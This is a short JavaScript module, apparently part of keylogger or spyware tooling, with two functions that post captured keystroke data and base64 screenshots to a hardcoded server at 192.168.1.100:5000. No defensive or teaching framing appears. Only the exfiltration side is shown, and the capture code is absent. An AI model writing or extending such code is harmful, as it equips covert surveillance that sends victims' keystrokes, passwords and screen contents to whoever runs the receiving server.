import axios from 'axios';

export const sendKeys = async (data) => {
  try {
    await axios.post('http://192.168.1.100:5000/upload_keys', data);
  } catch (e) {
    console.log('Send error:', e);
  }
};

export const sendScreen = async (base64Image) => {
  try {
    await axios.post('http://192.168.1.100:5000/upload_screen', {
      image: base64Image,
      timestamp: Date.now()
    });
  } catch (e) {
    console.log('Screen error:', e);
  }
};
